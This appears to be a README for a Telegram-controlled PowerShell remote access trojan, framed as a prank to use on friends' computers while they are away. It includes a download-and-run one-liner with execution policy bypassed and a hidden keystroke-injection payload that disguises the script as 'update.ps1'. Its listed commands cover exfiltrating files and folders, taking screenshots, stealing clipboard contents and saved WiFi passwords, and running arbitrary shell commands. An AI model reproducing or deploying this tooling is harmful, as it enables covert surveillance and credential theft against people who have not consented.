

# Telegram-Controlled PowerShell Script

**Get persistent remote control access through Telegram commands.**
Don't use it when your friends are away from their computer 🤫
This script allows you to control a Windows system remotely through Telegram, offering various functionalities like taking screenshots, sending files, recording audio/video, locking or restarting the system, and more.

## 🛠 Prerequisites

* Windows 10 or newer
* PowerShell 5 or later (built-in)
* Internet connection
* [ffmpeg](https://ffmpeg.org/download.html) installed and in system PATH (for audio/video recording)
* A Telegram bot token (from [@BotFather](https://t.me/BotFather))
* Your own Telegram user ID (use [@userinfobot](https://t.me/userinfobot))

### 📥 How to Create a Telegram Bot

1. Open Telegram and search for `@BotFather`.
2. Start a conversation and type `/newbot` to create a new bot.
3. Follow the instructions to set a name and username for your bot.
4. After completion, you will receive a **bot token** which you'll use in the script.

## 🔒 Enable Script Execution

Before running the script, allow PowerShell to execute local scripts:

### Powershell (Permanent fix)

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```

### Powershell (One-time fix for your session)

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### Powershell pipeline

```powershell
iwr 'https://example.com/urfile.ps1' -UseBasicParsing -OutFile $env:TEMP\prankware.ps1; powershell -ep bypass -File $env:TEMP\prankware.ps1
```

### Hidden PowerShell Ducky Script EXAMPLE
```txt
GUI r
DELAY 300
STRING powershell -WindowStyle Hidden -ep bypass -Command iwr 'https://example.com/urfile.ps1' -UseBasicParsing -OutFile $env:TEMP/update.ps1; powershell -ep bypass -File $env:TEMP/update.ps1
ENTER
```
---

## 📌 Available Commands

### System Control

* `/lock` → Locks the workstation.
* `/restart` → Restarts the computer.
* `/shutdown` → Shuts down the computer.
* `/notepad` → Opens Notepad.
* `/pcname` → Shows the computer name.
* `/ip` → Shows local and public IP addresses.
* `/screenshot` → Takes a screenshot and sends it to the chat.
* `/sendfile <path>` → Sends a file from the local disk.
* `/sendfolder <path>` → Sends a zipped folder.
* `/visit <url>` → Opens a URL in the default browser.
* `/screenshot`  →  Sends a screenshot.

### Navigation and File Operations

* `cd <path>` → Change directory.
* `cd` → Show current directory.
* `ls` or `dir` → List files/folders in current directory.
* `/delete <path>` → Delete a file or folder.
* `/rename <old> <new>` → Rename or move a file/folder.

### Monitoring & Processes

* `/processes` → List running processes.
* `/kill <pid>` → Kill process by PID.
* `/tasklist` → Top 25 processes by memory usage.
* `/taskkill <name>` → Kill processes by name.
* `/services` → List running services.

### Clipboard & System Info

* `/getclipboard` → Get text from clipboard.
* `/setclipboard <text>` → Set text to clipboard.
* `/sysinfo` → System details (CPU, RAM, OS, disk).
* `/wifi` → List saved WiFi networks + passwords.

### Other

* `/help` → Shows all commands.
* `/selfdestruct` → Removes persistence and deletes the script.
* `/cmd <command>` → Run CMD command.
* `/powershell <command>` → Run PowerShell command.

---


